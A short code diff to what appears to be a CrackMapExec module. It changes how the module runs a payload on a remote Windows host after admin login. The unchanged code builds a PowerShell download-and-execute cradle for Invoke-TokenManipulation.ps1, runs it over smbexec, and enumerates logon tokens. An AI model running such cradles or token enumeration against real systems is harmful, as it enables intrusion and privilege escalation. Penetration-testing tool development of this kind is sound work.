@@ -46,9 +46,8 @@ class CMEModule:
     def on_admin_login(self, context, connection):
         command = "Invoke-TokenManipulation -Enumerate | Select-Object Domain, Username, ProcessId, IsElevated | Out-String"
         launcher = gen_ps_iex_cradle(context, 'Invoke-TokenManipulation.ps1', command)
-        ps_command = create_ps_command(launcher)
 
-        connection.execute(ps_command, methods=['smbexec'])
+        connection.ps_execute(launcher, methods=['smbexec'])
         context.log.success('Executed payload')
 
     def on_request(self, context, request):
